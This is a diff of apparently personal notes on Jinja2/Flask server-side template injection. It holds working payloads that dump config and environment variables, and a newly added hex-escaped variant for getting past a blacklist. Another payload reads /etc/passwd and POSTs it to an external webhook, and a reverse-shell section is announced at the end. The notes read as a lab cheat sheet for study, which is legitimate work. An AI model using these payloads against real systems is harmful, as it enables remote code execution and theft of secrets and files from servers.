@@ -53,7 +53,7 @@ http://127.0.0.1:5000/?c={{%20(dict.mro()[-1]|attr(%22\x5f\x5fsubclasses\x5f\x5f
 - ##  Get name of current python flask script
 
 
-- Get all the current envvars
+- ## Get all the current envvars
 ```http://127.0.0.1:5000/?c={{config}}```: ```<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None,```
 ```http://127.0.0.1:5000/?c={{config.__class__}}``` : ```<class 'flask.config.Config'>```
 ```http://127.0.0.1:5000/?c={{config.__class__.from_envvar}}```: ```<function Config.from_envvar at 0x7facac89bf60>```
@@ -64,6 +64,11 @@ PAYLOAD:
 http://127.0.0.1:5000/?c={{config.__class__.from_envvar[%22__globals__%22][%22__builtins__%22][%22__import__%22](%22os%22).environ}}
 ```
 ![image](https://github.com/poorvi1910/Web/assets/146640913/de0b5534-d6a5-41aa-9c42-c4d4493f7a61)
+
+BLACKLIST:
+```
+http://127.0.0.1:5000/?c={{config.from_envvar[%27\x5f\x5fglobals\x5f\x5f%27][%27\x5f\x5fbuiltins\x5f\x5f%27][%27\x5f\x5fimport\x5f\x5f%27](%27os%27).environ}}
+```
 
 - ##  Read a local file
 
@@ -109,6 +114,8 @@ PAYLOAD:
 http://127.0.0.1:5000/?c={{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]('requests')['post']['__call__']('https://webhook-test.com/862d0fdb235354934d78409cb297c53c', data={'file': request.__class__.__init__.__globals__.__builtins__.open.__call__("/etc/passwd").read()}) }}
 ```
 ![image](https://github.com/poorvi1910/Web/assets/146640913/65bde4dc-928b-423c-9fc8-48ca1d5ecbe1)
+
+
 
 - ##  Create a reverse shell, save your work and run the command yes on the rev shell
 
